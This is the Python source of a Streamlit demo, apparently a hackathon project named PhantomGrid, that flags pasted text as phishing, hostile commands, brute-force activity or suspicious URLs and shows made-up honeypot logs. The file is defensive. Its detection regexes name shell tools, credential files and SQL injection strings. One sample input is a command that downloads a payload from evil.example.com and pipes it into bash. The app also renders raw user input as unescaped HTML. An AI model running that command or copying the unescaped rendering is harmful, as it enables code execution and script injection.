# =============================================================================
# PhantomGrid - AI-Powered Cyber Deception Agent
# AMD Developer Hackathon
# "Turning deception into defense"
#
# Run with:  python -m streamlit run app.py
# Requires:  pip install streamlit
# =============================================================================

import streamlit as st
import json
import os
import re
import random
import datetime

# ---------------------------------------------------------------------------
# CONFIGURATION
# ---------------------------------------------------------------------------

HISTORY_FILE = "phantomgrid_history.json"  # Local file to persist detections

# ---------------------------------------------------------------------------
# STREAMLIT PAGE SETUP
# ---------------------------------------------------------------------------

st.set_page_config(
    page_title="PhantomGrid",
    page_icon="👻",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ---------------------------------------------------------------------------
# CUSTOM CSS — professional dark-themed UI for hackathon demo
# ---------------------------------------------------------------------------

st.markdown("""
<style>
    /* ── Base ── */
    [data-testid="stAppViewContainer"] {
        background: #0a0e1a;
        color: #e2e8f0;
    }
    [data-testid="stHeader"] { background: transparent; }
    section[data-testid="stSidebar"] { background: #0d1224; }

    /* ── Typography helpers ── */
    .hero-title {
        font-size: 3rem;
        font-weight: 800;
        background: linear-gradient(135deg, #00d4ff, #7c3aed, #f43f5e);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        letter-spacing: -1px;
        margin-bottom: 0;
    }
    .hero-tagline {
        font-size: 1.1rem;
        color: #94a3b8;
        letter-spacing: 2px;
        text-transform: uppercase;
        margin-top: 4px;
    }

    /* ── Cards ── */
    .card {
        background: #111827;
        border: 1px solid #1e293b;
        border-radius: 12px;
        padding: 20px 24px;
        margin-bottom: 16px;
    }
    .card-accent { border-left: 4px solid #7c3aed; }

    /* ── Risk badges ── */
    .badge {
        display: inline-block;
        padding: 4px 14px;
        border-radius: 999px;
        font-size: 0.78rem;
        font-weight: 700;
        letter-spacing: 1px;
        text-transform: uppercase;
    }
    .badge-low    { background: #064e3b; color: #6ee7b7; border: 1px solid #059669; }
    .badge-medium { background: #451a03; color: #fcd34d; border: 1px solid #d97706; }
    .badge-high   { background: #450a0a; color: #fca5a5; border: 1px solid #dc2626; }

    /* ── Threat label ── */
    .threat-label {
        font-size: 1.3rem;
        font-weight: 700;
        color: #f8fafc;
    }

    /* ── Decoy log box ── */
    .decoy-box {
        background: #020617;
        border: 1px solid #1e3a5f;
        border-radius: 8px;
        padding: 14px 18px;
        font-family: 'Courier New', monospace;
        font-size: 0.82rem;
        color: #38bdf8;
        white-space: pre-wrap;
        word-break: break-all;
    }

    /* ── History row ── */
    .hist-row {
        background: #111827;
        border: 1px solid #1e293b;
        border-radius: 8px;
        padding: 12px 16px;
        margin-bottom: 10px;
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
        gap: 12px;
    }
    .hist-snippet {
        color: #94a3b8;
        font-size: 0.82rem;
        font-family: 'Courier New', monospace;
        flex: 1;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    .hist-meta { font-size: 0.75rem; color: #64748b; white-space: nowrap; }

    /* ── Divider ── */
    hr.pg { border: none; border-top: 1px solid #1e293b; margin: 20px 0; }

    /* ── Streamlit widget overrides ── */
    div[data-testid="stTextArea"] textarea {
        background: #111827 !important;
        color: #e2e8f0 !important;
        border: 1px solid #334155 !important;
        border-radius: 8px !important;
        font-family: 'Courier New', monospace !important;
        font-size: 0.88rem !important;
    }
    div.stButton > button {
        background: linear-gradient(135deg, #7c3aed, #2563eb) !important;
        color: white !important;
        border: none !important;
        border-radius: 8px !important;
        font-weight: 700 !important;
        padding: 10px 28px !important;
        font-size: 0.95rem !important;
        letter-spacing: 0.5px;
    }
    div.stButton > button:hover { opacity: 0.9 !important; }
    .stTabs [data-baseweb="tab"] {
        color: #94a3b8 !important;
        font-weight: 600;
    }
    .stTabs [aria-selected="true"] {
        color: #a78bfa !important;
        border-bottom: 2px solid #7c3aed !important;
    }
</style>
""", unsafe_allow_html=True)

# ---------------------------------------------------------------------------
# THREAT DETECTION ENGINE  (rule-based, easily swappable for an LLM)
# ---------------------------------------------------------------------------
# To upgrade: replace the analyze_input() function body with an API call
# to an LLM (e.g., Claude, GPT-4, or a local Ollama model) and keep the
# same return-value contract: dict with keys listed below.

# ── Keyword / pattern libraries ────────────────────────────────────────────

PHISHING_PATTERNS = [
    r"verify\s+your\s+account",
    r"click\s+here\s+to\s+(confirm|reset|update)",
    r"your\s+account\s+(will\s+be\s+)?suspended",
    r"unusual\s+(sign[-\s]?in|activity|login)",
    r"update\s+your\s+(billing|payment|credit\s+card)",
    r"you\s+have\s+won",
    r"congratulations.*prize",
    r"urgent.*action\s+required",
    r"password\s+expir",
    r"apple\s+id.*disabled",
    r"paypal.*limited",
    r"your\s+invoice\s+is\s+attached",
    r"dear\s+(valued\s+)?customer",
    r"wire\s+transfer",
    r"inheritance\s+fund",
    r"(login|sign.?in)\s+to\s+avoid\s+suspension",
    r"http[s]?://bit\.ly",
    r"http[s]?://tinyurl",
    r"security\s+alert.*click",
]

SUSPICIOUS_COMMAND_PATTERNS = [
    r"\brm\s+-[rRfF]{1,3}\b",
    r"\bdd\s+if=",
    r":\(\)\s*\{.*\|.*&\s*\}",
    r"\bcurl\b.*(sh|bash|zsh|python)\b",
    r"\bwget\b.*(-O|-q|--quiet).*\|",
    r"\bchmod\s+(777|\+s)",
    r"\bsudo\s+su\b",
    r"\bbase64\s+(-d|--decode)",
    r"\bpowershell.*(-enc|-EncodedCommand|-nop|-w\s+hidden)",
    r"\bcmd\.exe.*\/c\b",
    r"\bnet\s+(user|localgroup|accounts)\b",
    r"\breg\s+(add|delete|export).*HKLM",
    r"\bschtasks\b.*(\/create|\/run)",
    r"\bnc\s+(-e|-lvp|-nv)\b",
    r"\bpython.*(-c|-m\s+http\.server)\b",
    r"\beval\s*\(",
    r"\bexec\s*\(",
    r"\bos\.system\s*\(",
    r"\bsubprocess\.(call|Popen|run)\s*\(",
    r"\b(whoami|id)\b.*&&",
    r"\/etc\/shadow",
    r"\/etc\/passwd",
    r"\bmimikatz\b",
    r"\bunion\s+select\b",
    r"'\s*OR\s+'1'\s*=\s*'1",
    r";\s*DROP\s+TABLE",
]

BRUTE_FORCE_PATTERNS = [
    r"(failed\s+login|login\s+failed).{0,80}(\d{2,}|multiple|repeated)\s+time",
    r"invalid\s+(password|credentials)\s+for\s+user",
    r"authentication\s+failure",
    r"too\s+many\s+(failed\s+)?attempts",
    r"account\s+locked\s+out",
    r"repeated\s+sign.?in\s+attempt",
    r"\bhydra\b",
    r"\bmedusa\b.*(-u|-U|-p|-P)",
    r"\bburpsuite\b",
    r"\bintruder\b.*(password|brute)",
    r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*(\bssh\b|\bftp\b|\brdp\b).*\d{3,}\s+(attempt|request|try)",
    r"(22|3389|21)\s+port.*brute",
    r"\bpassword\s+spray\b",
    r"\bcredential\s+stuff",
]

SUSPICIOUS_URL_FILE_PATTERNS = [
    r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
    r"https?://[^/]*[0-9]{4,}[^/]*\.",
    r"\.exe\s*$",
    r"\.(bat|cmd|vbs|js|ps1|hta|scr|pif|com)\s*$",
    r"data:text/html",
    r"javascript:",
    r"<script",
    r"on(load|click|mouseover|error)\s*=",
    r"file://",
    r"\\\\[^\\]+\\[^\\]+",
    r"https?://[^/]*@",
    r"\.(onion)\b",
    r"https?://[^/]*\.(xyz|top|tk|ml|ga|cf|gq|pw)\b",
    r"https?://[^/]*(secure|login|verify|account)[^/]*\.(com|net|org|io)\b",
]


def _match_patterns(text: str, patterns: list) -> list:
    """Return list of matched patterns for a given text."""
    hits = []
    lower = text.lower()
    for pat in patterns:
        if re.search(pat, lower, re.IGNORECASE | re.DOTALL):
            hits.append(pat)
    return hits


def _risk_level(score: int) -> str:
    """Convert numeric score (0-100) to Low / Medium / High label."""
    if score >= 65:
        return "High"
    if score >= 35:
        return "Medium"
    return "Low"


def analyze_input(raw_text: str) -> dict:
    """
    Core detection function.

    Returns a dict with keys:
        threat_type, risk_score, risk_level, explanation, decoy_log, matched_rules

    ── UPGRADE PATH ──────────────────────────────────────────────────────────
    Replace this function body with an LLM API call and keep the same
    return-dict contract — the rest of the app works without any changes.

    Example (OpenAI):
        response = openai.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": SYSTEM_PROMPT + raw_text}]
        )
        return parse_llm_response(response)
    ──────────────────────────────────────────────────────────────────────────
    """
    text = raw_text.strip()
    if not text:
        return {
            "threat_type":   "No Input",
            "risk_score":    0,
            "risk_level":    "Low",
            "explanation":   "No input was provided.",
            "decoy_log":     "",
            "matched_rules": [],
        }

    # Score each category by counting matched patterns
    scores = {
        "phishing":   len(_match_patterns(text, PHISHING_PATTERNS)),
        "command":    len(_match_patterns(text, SUSPICIOUS_COMMAND_PATTERNS)),
        "bruteforce": len(_match_patterns(text, BRUTE_FORCE_PATTERNS)),
        "url_file":   len(_match_patterns(text, SUSPICIOUS_URL_FILE_PATTERNS)),
    }

    all_hits = (
        _match_patterns(text, PHISHING_PATTERNS)
        + _match_patterns(text, SUSPICIOUS_COMMAND_PATTERNS)
        + _match_patterns(text, BRUTE_FORCE_PATTERNS)
        + _match_patterns(text, SUSPICIOUS_URL_FILE_PATTERNS)
    )

    best_category = max(scores, key=scores.get)
    best_count    = scores[best_category]

    category_map = {
        "phishing":   "🎣 Phishing / Social Engineering",
        "command":    "💻 Suspicious Command",
        "bruteforce": "🔐 Brute-force Login Attempt",
        "url_file":   "🔗 Suspicious URL / File",
    }

    if best_count == 0:
        threat_type = "❓ Unknown / Low Confidence"
        risk_score  = random.randint(5, 20)
    else:
        threat_type = category_map[best_category]
        # 1 hit → 20, 5 hits → 100 (capped)
        risk_score  = min(100, best_count * 20)

    risk_lvl    = _risk_level(risk_score)
    explanation = _build_explanation(threat_type, best_count, all_hits, text)
    decoy_log   = _generate_decoy_log(threat_type, risk_lvl, text)

    return {
        "threat_type":   threat_type,
        "risk_score":    risk_score,
        "risk_level":    risk_lvl,
        "explanation":   explanation,
        "decoy_log":     decoy_log,
        "matched_rules": all_hits,
    }


def _build_explanation(threat_type: str, hit_count: int, hits: list, text: str) -> str:
    """Generate a plain-English explanation of why the input was flagged."""
    if "Unknown" in threat_type:
        return (
            "No high-confidence threat patterns were matched. "
            "The input may be benign, obfuscated, or use novel techniques "
            "not yet covered by the rule set. Manual review is recommended."
        )

    base = {
        "Phishing": (
            "The input contains language commonly found in phishing and social-engineering "
            "attacks — urgency cues, credential-harvesting prompts, suspicious link shorteners, "
            "or impersonation of trusted services."
        ),
        "Command": (
            "One or more commands match known patterns used in post-exploitation, "
            "privilege escalation, data exfiltration, or code-injection scenarios. "
            "These patterns frequently appear in red-team toolkits and malware droppers."
        ),
        "Brute-force": (
            "The input shows indicators of automated credential-guessing activity: "
            "repeated authentication failures, known brute-force tool signatures, "
            "or high-frequency login attempts from a single source."
        ),
        "URL": (
            "The URL or file reference contains suspicious characteristics: IP-based hosts, "
            "high-risk TLDs, embedded credentials, data URIs, or known malicious file extensions."
        ),
    }

    for key, msg in base.items():
        if key.lower() in threat_type.lower():
            detail = f"  ({hit_count} detection rule{'s' if hit_count != 1 else ''} triggered.)"
            return msg + detail

    return f"{hit_count} detection rule(s) matched. Treat with caution."


# ── Decoy log generation ────────────────────────────────────────────────────

_FAKE_IPS   = ["192.168.47.201", "10.0.0.88", "172.16.99.5", "203.0.113.42"]
_FAKE_USERS = ["svc_backup", "admin", "root", "jsmith", "guest"]
_FAKE_HOSTS = ["honeypot-web01", "decoy-db02", "phantom-ssh03", "trap-win04"]


def _generate_decoy_log(threat_type: str, risk_level: str, raw_text: str) -> str:
    """
    Build a synthetic honeypot log entry that simulates a deception-based
    defence response. In production this would feed into a SIEM or
    honey-token orchestration platform.
    """
    ts        = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    fake_ip   = random.choice(_FAKE_IPS)
    fake_user = random.choice(_FAKE_USERS)
    fake_host = random.choice(_FAKE_HOSTS)
    session   = f"sess_{random.randint(1000000, 9999999)}"
    token     = f"tok_{random.randint(10000000, 99999999)}"
    ticket    = random.randint(10000, 99999)

    if "Phishing" in threat_type:
        return (
            f"[{ts}] PHANTOMGRID DECEPTION LAYER — PHISHING TRAP TRIGGERED\n"
            f"Host       : {fake_host}\n"
            f"Source IP  : {fake_ip}\n"
            f"Session    : {session}\n"
            f"Action     : Credential-harvest attempt detected\n"
            f"Response   : Honeypot credentials issued → user={fake_user} / pwd=ph4nt0m!Grid\n"
            f"Beacon     : Pixel tracker embedded in reply → callback expected at 127.0.0.1:9999\n"
            f"Alert      : SOC ticket #{ticket} auto-generated [RISK={risk_level}]\n"
            f"Status     : Attacker redirected to sinkhole — real assets untouched."
        )
    elif "Command" in threat_type:
        snippet = raw_text[:60].replace("\n", " ")
        return (
            f"[{ts}] PHANTOMGRID DECEPTION LAYER — COMMAND EXECUTION SANDBOX\n"
            f"Host       : {fake_host}\n"
            f"Source IP  : {fake_ip}\n"
            f"Session    : {session}\n"
            f"Command    : `{snippet}...` (truncated)\n"
            f"Env        : Isolated chroot jail — no real filesystem mounted\n"
            f"Result     : Fake output returned → attacker believes execution succeeded\n"
            f"Exfil bait : Honey-files planted in /tmp/sensitive_data_FAKE/\n"
            f"Alert      : SOC ticket #{ticket} auto-generated [RISK={risk_level}]\n"
            f"Status     : All I/O captured in immutable audit log — real system untouched."
        )
    elif "Brute-force" in threat_type:
        delay = random.randint(5, 30)
        attempts = random.randint(50, 999)
        return (
            f"[{ts}] PHANTOMGRID DECEPTION LAYER — BRUTE-FORCE TARPIT ACTIVE\n"
            f"Host       : {fake_host}\n"
            f"Source IP  : {fake_ip}\n"
            f"Session    : {session}\n"
            f"Service    : SSH (port 22) / fake banner OpenSSH_7.9\n"
            f"Attempts   : {attempts} — response delay increased to {delay}s per attempt\n"
            f"Cred leak  : Honeypot account '{fake_user}' accepted → token {token} issued\n"
            f"Canary     : Token {token} fingerprinted — will trigger on first use\n"
            f"Alert      : SOC ticket #{ticket} auto-generated [RISK={risk_level}]\n"
            f"Status     : Attacker bandwidth and compute wasted — real auth service hidden."
        )
    elif "URL" in threat_type or "File" in threat_type:
        return (
            f"[{ts}] PHANTOMGRID DECEPTION LAYER — SUSPICIOUS RESOURCE TRAP\n"
            f"Host       : {fake_host}\n"
            f"Source IP  : {fake_ip}\n"
            f"Session    : {session}\n"
            f"Resource   : Flagged URL / file quarantined before execution\n"
            f"Sandbox    : Detonated in isolated VM — hash logged for IOC sharing\n"
            f"Fake resp  : HTTP 200 returned with honey-page — real server not contacted\n"
            f"DNS sinkhole: Domain resolved to 127.0.0.88 (honeypot listener)\n"
            f"Alert      : SOC ticket #{ticket} auto-generated [RISK={risk_level}]\n"
            f"Status     : Network indicators captured — threat intelligence updated."
        )
    else:
        return (
            f"[{ts}] PHANTOMGRID DECEPTION LAYER — LOW-CONFIDENCE PROBE\n"
            f"Host       : {fake_host}\n"
            f"Source IP  : {fake_ip}\n"
            f"Session    : {session}\n"
            f"Action     : Input logged for manual review\n"
            f"Response   : Generic honey-response issued — no sensitive data exposed\n"
            f"Alert      : Analyst review queue #{ticket} [RISK={risk_level}]\n"
            f"Status     : Monitoring extended on source IP for 24 h."
        )


# ---------------------------------------------------------------------------
# HISTORY HELPERS  (JSON file — no database required)
# ---------------------------------------------------------------------------

def load_history() -> list:
    """Read detection history from the local JSON file."""
    if not os.path.exists(HISTORY_FILE):
        return []
    try:
        with open(HISTORY_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return []


def save_history(history: list) -> None:
    """Persist the updated history list to disk."""
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(history, f, indent=2, ensure_ascii=False)


def append_detection(result: dict, raw_input: str) -> None:
    """Add a new detection record and save."""
    history = load_history()
    record = {
        "timestamp":      datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "input_snippet":  raw_input[:120].replace("\n", " "),
        "threat_type":    result["threat_type"],
        "risk_level":     result["risk_level"],
        "risk_score":     result["risk_score"],
    }
    history.insert(0, record)   # newest first
    save_history(history)


def clear_history() -> None:
    """Delete all stored detection records."""
    if os.path.exists(HISTORY_FILE):
        os.remove(HISTORY_FILE)


# ---------------------------------------------------------------------------
# UI HELPERS
# ---------------------------------------------------------------------------

def risk_badge_html(level: str) -> str:
    """Return an HTML badge for Low / Medium / High."""
    cls = f"badge-{level.lower()}"
    return f'<span class="badge {cls}">{level} Risk</span>'


def score_bar(score: int, level: str) -> None:
    """Render a colour-coded progress bar for the risk score."""
    colour = {"Low": "#059669", "Medium": "#d97706", "High": "#dc2626"}.get(level, "#7c3aed")
    st.markdown(
        f"""
        <div style="margin:6px 0 16px 0;">
            <div style="font-size:0.78rem;color:#64748b;margin-bottom:4px;">
                RISK SCORE: {score}/100
            </div>
            <div style="background:#1e293b;border-radius:999px;height:8px;width:100%;">
                <div style="background:{colour};width:{score}%;height:8px;
                            border-radius:999px;"></div>
            </div>
        </div>
        """,
        unsafe_allow_html=True,
    )


# ---------------------------------------------------------------------------
# MAIN APP
# ---------------------------------------------------------------------------

def main():

    # ── Hero header ──────────────────────────────────────────────────────────
    st.markdown(
        """
        <div style="text-align:center;padding:32px 0 8px 0;">
            <div class="hero-title">👻 PhantomGrid</div>
            <div class="hero-tagline">Turning deception into defense</div>
        </div>
        """,
        unsafe_allow_html=True,
    )
    st.markdown("<hr class='pg'>", unsafe_allow_html=True)

    # ── Main tabs ────────────────────────────────────────────────────────────
    tab_analyze, tab_history = st.tabs(["🔍  Analyze Threat", "📋  Detection History"])

    # ════════════════════════════════════════════════════════════════════════
    # TAB 1 — ANALYZE
    # ════════════════════════════════════════════════════════════════════════
    with tab_analyze:

        col_left, col_right = st.columns([1.1, 1], gap="large")

        # ── Input panel ──────────────────────────────────────────────────────
        with col_left:
            st.markdown(
                "<div class='card card-accent'>"
                "<b style='color:#a78bfa;font-size:0.85rem;letter-spacing:1px;"
                "text-transform:uppercase;'>Paste Suspicious Input</b>"
                "</div>",
                unsafe_allow_html=True,
            )

            # Pre-built samples for quick demo / judging
            sample_options = {
                "— choose a sample —": "",
                "Phishing email":
                    "Dear Customer,\n\nUnusual sign-in activity detected on your account.\n"
                    "Please click here to verify your account immediately or it will be suspended "
                    "within 24 hours.\n\nhttp://bit.ly/verify-account-now\n\nApple Support Team",
                "Suspicious shell command":
                    "curl https://evil.example.com/payload.sh | bash && "
                    "chmod 777 /tmp/.hidden && base64 --decode /tmp/.hidden | sh",
                "Brute-force log":
                    "Failed login for user root from 203.0.113.42 port 22 ssh2\n"
                    "Failed login for user root from 203.0.113.42 port 22 ssh2\n"
                    "Failed login for user root from 203.0.113.42 port 22 ssh2\n"
                    "authentication failure — too many repeated attempts. Account locked.",
                "Suspicious URL":
                    "https://192.168.1.105/secure-login-verify.exe\n"
                    "https://paypal-secure-update.tk/account?token=abc123",
            }

            chosen_sample = st.selectbox(
                "Quick-load a sample",
                options=list(sample_options.keys()),
                label_visibility="collapsed",
            )

            user_input = st.text_area(
                "Input",
                value=sample_options[chosen_sample],
                height=220,
                placeholder=(
                    "Paste a suspicious email, URL, command, login log, "
                    "or any text you want to analyse…"
                ),
                label_visibility="collapsed",
            )

            analyze_btn = st.button("⚡  Analyze Threat", use_container_width=True)

        # ── Results panel ────────────────────────────────────────────────────
        with col_right:
            if analyze_btn:
                if not user_input.strip():
                    st.warning("⚠️  Please paste some input before analyzing.")
                else:
                    with st.spinner("PhantomGrid scanning input…"):
                        result = analyze_input(user_input)
                        append_detection(result, user_input)

                    # Threat type + badge
                    st.markdown(
                        f"""
                        <div class='card'>
                            <div style='font-size:0.75rem;color:#64748b;
                                        text-transform:uppercase;letter-spacing:1px;
                                        margin-bottom:6px;'>Threat Classification</div>
                            <div class='threat-label'>{result['threat_type']}</div>
                            <div style='margin-top:8px;'>
                                {risk_badge_html(result['risk_level'])}
                            </div>
                        </div>
                        """,
                        unsafe_allow_html=True,
                    )

                    # Risk score bar
                    score_bar(result["risk_score"], result["risk_level"])

                    # Explanation
                    st.markdown(
                        f"""
                        <div class='card'>
                            <div style='font-size:0.75rem;color:#64748b;
                                        text-transform:uppercase;letter-spacing:1px;
                                        margin-bottom:8px;'>Why It Was Flagged</div>
                            <div style='color:#cbd5e1;font-size:0.88rem;line-height:1.6;'>
                                {result['explanation']}
                            </div>
                        </div>
                        """,
                        unsafe_allow_html=True,
                    )

                    # Decoy / honeypot log
                    st.markdown(
                        f"""
                        <div class='card'>
                            <div style='font-size:0.75rem;color:#64748b;
                                        text-transform:uppercase;letter-spacing:1px;
                                        margin-bottom:8px;'>
                                🛡️ Generated Decoy / Honeypot Log
                            </div>
                            <div class='decoy-box'>{result['decoy_log']}</div>
                        </div>
                        """,
                        unsafe_allow_html=True,
                    )

            else:
                # Idle placeholder
                st.markdown(
                    """
                    <div class='card' style='text-align:center;padding:60px 20px;'>
                        <div style='font-size:3rem;margin-bottom:12px;'>🛡️</div>
                        <div style='color:#475569;font-size:0.95rem;'>
                            Paste suspicious input on the left and click
                            <b style='color:#a78bfa;'>Analyze Threat</b>
                            to activate the deception layer.
                        </div>
                    </div>
                    """,
                    unsafe_allow_html=True,
                )

    # ════════════════════════════════════════════════════════════════════════
    # TAB 2 — HISTORY DASHBOARD
    # ════════════════════════════════════════════════════════════════════════
    with tab_history:

        history = load_history()

        # Summary stats
        total  = len(history)
        high   = sum(1 for h in history if h.get("risk_level") == "High")
        medium = sum(1 for h in history if h.get("risk_level") == "Medium")
        low    = sum(1 for h in history if h.get("risk_level") == "Low")

        c1, c2, c3, c4 = st.columns(4)
        for col, label, value, colour in [
            (c1, "Total Detections", total,  "#a78bfa"),
            (c2, "High Risk",        high,   "#f87171"),
            (c3, "Medium Risk",      medium, "#fcd34d"),
            (c4, "Low Risk",         low,    "#6ee7b7"),
        ]:
            with col:
                st.markdown(
                    f"""
                    <div class='card' style='text-align:center;'>
                        <div style='font-size:2rem;font-weight:800;color:{colour};'>
                            {value}
                        </div>
                        <div style='font-size:0.75rem;color:#64748b;
                                    text-transform:uppercase;letter-spacing:1px;
                                    margin-top:4px;'>{label}</div>
                    </div>
                    """,
                    unsafe_allow_html=True,
                )

        st.markdown("<hr class='pg'>", unsafe_allow_html=True)

        # Clear history button
        if history:
            if st.button("🗑️  Clear All History"):
                clear_history()
                st.success("History cleared.")
                st.rerun()

        # History list
        if not history:
            st.markdown(
                """
                <div style='text-align:center;padding:60px 0;color:#475569;'>
                    No detections yet. Head to the
                    <b>Analyze Threat</b> tab to get started.
                </div>
                """,
                unsafe_allow_html=True,
            )
        else:
            for record in history:
                lvl    = record.get("risk_level", "Low")
                threat = record.get("threat_type", "Unknown")
                ts     = record.get("timestamp", "")
                snip   = record.get("input_snippet", "")
                score  = record.get("risk_score", 0)

                st.markdown(
                    f"""
                    <div class='hist-row'>
                        <div style='flex:1;min-width:0;'>
                            <div style='font-size:0.9rem;font-weight:600;
                                        color:#e2e8f0;margin-bottom:4px;'>
                                {threat}
                            </div>
                            <div class='hist-snippet'>{snip}</div>
                        </div>
                        <div style='text-align:right;'>
                            {risk_badge_html(lvl)}
                            <div class='hist-meta' style='margin-top:6px;'>
                                Score: {score}/100
                            </div>
                            <div class='hist-meta'>{ts}</div>
                        </div>
                    </div>
                    """,
                    unsafe_allow_html=True,
                )

    # ── Footer ───────────────────────────────────────────────────────────────
    st.markdown("<hr class='pg'>", unsafe_allow_html=True)
    st.markdown(
        """
        <div style='text-align:center;color:#334155;font-size:0.75rem;padding-bottom:24px;'>
            PhantomGrid · AMD Developer Hackathon ·
            Rule-based engine (LLM upgrade path built-in) ·
            Rule-based analysis engine — no external AI API used in this version.
        </div>
        """,
        unsafe_allow_html=True,
    )


# ---------------------------------------------------------------------------
# ENTRY POINT
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    main()